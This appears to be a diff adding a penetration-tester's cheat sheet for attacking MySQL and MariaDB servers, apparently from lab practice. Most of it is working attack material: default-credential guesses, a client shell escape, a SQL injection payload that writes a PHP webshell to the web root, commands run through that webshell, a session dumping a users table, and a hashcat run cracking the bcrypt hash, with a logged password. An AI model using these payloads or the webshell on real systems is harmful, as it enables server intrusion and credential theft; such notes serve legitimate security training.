@@ -1,1 +1,84 @@
+$ mysql -h 192.168.155.x -P 3306 -u root -root
+$ mysql -h 192.168.137.x -P 3306 -u mute -p
+
+# Commands
+sql> show databases;
+sql> use {DATABASE};
+sql> show tables;
+sql> describe {TABLE};
+sql> show columns from {TABLE};
+
+sql> select version();
+sql> select @@version(); 
+sql> select user(); 
+sql> select database();
+
+#Get a shell with the mysql client user
+\! sh
+
+\! clear  ←  clear screen
+
+Testing validity of found mysql credentials
+$ mysql -username -password -e 'show databases;'
+
+
+MYSQL Credentials? Root Unauthorized Access?
+mysql -uroot -p
+Enter Password:
+root : root
+root : toor
+root :
+
+
+Although the various MySQL database variants don't offer a single function to escalate to RCE like xp_cmdshell, we can abuse the SELECT INTO_OUTFILE statement to write files on the web server.
+For this attack to work, the file location must be writable to the OS user running the database software.
+
+Write a WebShell To Disk via INTO OUTFILE directive
+As an example, let's resume the UNION payload on our MySQL target application, expanding the query that writes a webshell on disk.
+We'll issue the UNION SELECT SQL keywords to include a single PHP line into the first column and save it as webshell.php in a writable web folder.
+
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+
+The written PHP code file results in the following:
+<? system($_REQUEST['cmd']); ?>
+   
+The PHP system function will parse any statement included in the cmd parameter coming from the client HTTP REQUEST, thus acting like a web-interactive command shell.
+To confirm, we can access the newly created webshell inside the tmp folder along with the id command.
+
+192.168.191.x/tmp/webshell.php?cmd=ls
+
+We are executing commands as the www-data user, an identity commonly associated with web servers on Linux systems.    
+
+
+$ mysql -h 192.168.137.145 -P 3306 -u mute -p
+Enter password: C78maEQUI
+
+MariaDB Example
+MariaDB [(none)]> SELECT user();
++------------------------+
+| user()                 |
++------------------------+
+| mute@192.168.49.x |
++------------------------+
+
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mute            |
++--------------------+
+2 rows in set (0.073 sec)
+
+MariaDB [mute]> select * from users_secure;
++----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
+| id | username | password                                                     | salt                           | last_update         | password_history1 | salt_history1 | password_history2 | salt_history2 |
++----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
+|  1 | admin    | $2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8Xn | $2a$05$bJcIfCBjN5Fuh0K9qfoe0n$ | 2021-05-17 10:56:27 | NULL              | NULL          | NULL              | NULL          |
++----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
+1 row in set (0.072 sec)
+
+$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt --show
+$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC:thedoctor
+
 
